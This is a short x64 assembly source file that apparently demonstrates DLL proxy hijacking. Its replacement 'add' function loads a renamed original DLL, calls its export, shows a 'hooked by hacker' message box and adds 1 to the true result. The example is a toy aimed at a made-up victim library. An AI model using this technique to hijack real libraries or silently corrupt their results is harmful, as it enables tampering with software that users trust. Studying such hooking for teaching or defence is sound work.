include kernel32.inc
include user32.inc

includelib	kernel32.Lib
includelib	User32.Lib

.DATA
handle				DQ ?
function			DQ ?
retaddr				DQ ?

.CONST
VICTIMDLLOLD		DB "VictimDllOLD.dll", 0
ADD_STR				DB "add", 0
PROMPT_TITLE		DB "Hooked", 0
PROMPT_CONTENT		DB "Your DLL is hooked by hacker! The sum function won't get a correct result!", 0


.CODE
add2 PROC
	PUSH RBP
	MOV RBP, RSP
	PUSH RCX
	PUSH RDX

	MOV RCX, OFFSET VICTIMDLLOLD
	; Special Treatment https://docs.microsoft.com/en-us/cpp/build/stack-usage?view=msvc-170
	; Note that space is always allocated for the register parameters, even if the parameters themselves are never homed to the stack; a callee is guaranteed that space has been allocated for all its parameters. 
	SUB RSP, 20H 
	CALL LoadLibraryA
	ADD RSP, 20H
	MOV handle, RAX

	MOV RDX, OFFSET ADD_STR
	MOV RCX, handle
	SUB RSP, 20H
	CALL GetProcAddress
	ADD RSP, 20H
	MOV function, RAX

	MOV R9, 0
	MOV R8, OFFSET PROMPT_TITLE
	MOV RDX, OFFSET PROMPT_CONTENT
	MOV RCX, 0
	SUB RSP, 20H
	CALL MessageBoxA
	ADD RSP, 20H

	POP RDX
	POP RCX
	SUB RSP, 20H
	CALL QWORD PTR function
	ADD RSP, 20H
	ADD RAX, 1
    
	LEAVE
    RET
add2 ENDP

END